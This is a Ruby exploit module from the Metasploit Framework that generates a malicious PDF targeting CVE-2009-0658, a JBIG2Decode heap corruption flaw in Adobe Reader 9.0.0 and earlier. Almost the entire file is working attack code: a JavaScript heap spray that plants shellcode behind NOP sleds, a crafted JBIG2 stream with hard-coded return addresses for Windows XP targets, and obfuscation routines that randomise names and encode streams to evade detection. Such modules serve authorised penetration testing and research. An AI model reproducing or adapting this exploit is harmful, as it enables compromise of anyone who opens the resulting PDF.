##
# $Id: adobe_jbig2decode.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe JBIG2Decode Memory Corruption Exploit',
			'Description'    => %q{
					This module exploits a heap-based pointer corruption flaw in Adobe Reader 9.0.0 and earlier.
					This module relies upon javascript for the heap spray.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					# Metasploit implementation
					'natron',
					# bl4cksecurity blog explanation of vuln [see References]
					'xort', 'redsand',
					# obfuscation techniques and pdf template from util_printf
					'MC', 'Didier Stevens <didier.stevens[at]gmail.com>',
				],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE' , '2009-0658' ],
					[ 'OSVDB', '52073' ],
					[ 'URL', 'http://bl4cksecurity.blogspot.com/2009/03/adobe-acrobatreader-universal-exploit.html'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => ""
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Adobe Reader v9.0.0 (Windows XP SP3 English)', { 'Ret' => 0x0166B550 } ], # Ret * 5 == 0x07018A90 (BIB.dll)
					[ 'Adobe Reader v8.1.2 (Windows XP SP2 English)', { 'Ret' => 0x9B004870 } ], # Ret * 5 == 0x07017A30 (BIB.dll)
				],
			'DisclosureDate' => 'Feb 19 2009',
			'DefaultTarget'  => 0))

		register_options([
			OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
		], self.class)

		end

	def exploit
		# Encode the shellcode.
		shellcode 		= Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		ptroverwrite 	= Rex::Text.to_unescape([target.ret].pack("V"))

		nops    = Rex::Text.to_unescape(make_nops(4))

		# Randomize some variables
		rand1	= rand_text_alpha(rand(50) + 1)
		rand2	= rand_text_alpha(rand(50) + 1)
		rand3	= rand_text_alpha(rand(50) + 1)
		rand4	= rand_text_alpha(rand(50) + 1)
		rand5	= rand_text_alpha(rand(50) + 1)
		rand6	= rand_text_alpha(rand(50) + 1)
		rand7	= rand_text_alpha(rand(50) + 1)
		rand8	= rand_text_alpha(rand(50) + 1)
		rand9	= rand_text_alpha(rand(50) + 1)
		rand10	= rand_text_alpha(rand(50) + 1)
		rand11	= rand_text_alpha(rand(50) + 1)
		rand12	= rand_text_alpha(rand(50) + 1)
		rand13	= rand_text_alpha(rand(50) + 1)
		rand14	= rand_text_alpha(rand(50) + 1)
		rand15	= rand_text_alpha(rand(50) + 1)
		rand16	= rand_text_alpha(rand(50) + 1)

		script = %Q|
		var #{rand1} = "";
		var #{rand2} = "";
		var #{rand3} = unescape("#{shellcode}");
		var #{rand4} = "";

		for (#{rand5}=128;#{rand5}>=0;--#{rand5}) #{rand4} += unescape("#{nops}");
		#{rand6} = #{rand4} + #{rand3};
		#{rand7} = unescape("#{nops}");
		#{rand8} = 20;
		#{rand9} = #{rand8}+#{rand6}.length
		while (#{rand7}.length<#{rand9}) #{rand7}+=#{rand7};
		#{rand10} = #{rand7}.substring(0, #{rand9});
		#{rand11} = #{rand7}.substring(0, #{rand7}.length-#{rand9});
		while(#{rand11}.length+#{rand9} < 0x40000) #{rand11} = #{rand11}+#{rand11}+#{rand10};
		#{rand12} = new Array();
		for (#{rand5}=0;#{rand5}<100;#{rand5}++) #{rand12}[#{rand5}] = #{rand11} + #{rand6};

		for (#{rand5}=142;#{rand5}>=0;--#{rand5}) #{rand2} += unescape("#{ptroverwrite}");
		#{rand13} = #{rand2}.length + 20
		while (#{rand2}.length < #{rand13}) #{rand2} += #{rand2};
		#{rand14} = #{rand2}.substring(0, #{rand13});
		#{rand15} = #{rand2}.substring(0, #{rand2}.length-#{rand13});
		while(#{rand15}.length+#{rand13} < 0x40000) #{rand15} = #{rand15}+#{rand15}+#{rand14};
		#{rand16} = new Array();
		for (#{rand5}=0;#{rand5}<125;#{rand5}++) #{rand16}[#{rand5}] = #{rand15} + #{rand2};
|
		eaxptr		= "\x00\x20\x50\xff" 		# CALL DWORD PTR DS:[EAX+20]
		eaxp20ptr	= "\x05\x69\x50\x50"		# Shellcode location called by CALL DWORD PTR DS:[EAX+20]
		modifier	= "\x00\x69\x00\x00"		# ECX values seen: 02004A00, 033C9F58, 0338A228, 031C51F8, 0337B418
								# natron@kubuntu-nkvm:~$ ./pdf-calc-val.rb 0x690000
								# EAX: 0x690000   ECX: 0x2004a00   WriteAddr: 0xa3449ec
								# EAX: 0x690000   ECX: 0x358a228   WriteAddr: 0xb8ca214

		jbig2stream	= eaxptr + "\x40\x00" + modifier + eaxp20ptr

		# Create the pdf
		pdf = make_pdf(script, jbig2stream)

		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(pdf)
	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(3) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			# Randomize the spaces and newlines
			elsif c == " "
				result << " " * (rand(3) + 1)
				if rand(2) == 0
					result << "\x0d\x0a"
					result << " " * rand(2)
				end
			else
				result << c
			end
		end
		result
	end

	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end

	def make_pdf(js, jbig2)

		xref = []
		eol = "\x0d\x0a"
		endobj = "endobj" << eol

		pdf = "%PDF-1.5" << eol
		pdf << "%" << RandomNonASCIIString(4) << eol
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(1) << nObfu(" << /Type /Catalog /Outlines ") << ioRef(2) << nObfu(" /Pages ") << ioRef(3) << nObfu(" /OpenAction ") << ioRef(5) << " >> " << endobj
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(2) << nObfu(" << /Type /Outlines /Count 0 >> ") << endobj
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(3) << nObfu(" << /Type /Pages /Kids [ ") << ioRef(4) << nObfu(" ") << ioRef(7) << nObfu(" ] /Count 2 >> ") << endobj
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(4) << nObfu(" << /Type /Page /Parent ") << ioRef(3) << nObfu(" /MediaBox [0 0 612 792 ] >> ") << endobj
		xref << pdf.length
		pdf << nObfu(" ") << ioDef(5) << nObfu(" << /Type /Action /S /JavaScript /JS ") + ioRef(6) + " >> " << endobj
		xref << pdf.length

		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js), rand(5)+4) # Add random 4-9 compression level
		pdf << nObfu(" ") << ioDef(6) << nObfu(" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode ] >>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj
		xref << pdf.length

		pdf << nObfu(" ") << ioDef(7) << nObfu(" << /Type /Page /Parent ") << ioRef(3) << " /Contents [ " << ioRef(8) << " ] >> " << eol

		xref << pdf.length
		compressed = Zlib::Deflate.deflate(jbig2.unpack('H*')[0], rand(8)+1) # Convert to ASCII hex, then deflate using random 1-9 compression
		pdf << nObfu(" ") << ioDef(8) << nObfu(" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode /JBIG2Decode ] >> " % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj

		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		pdf << "trailer" << nObfu("<< /Size %d /Root " % (xref.length + 1)) << ioRef(1) << " >> " << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol
	end

end
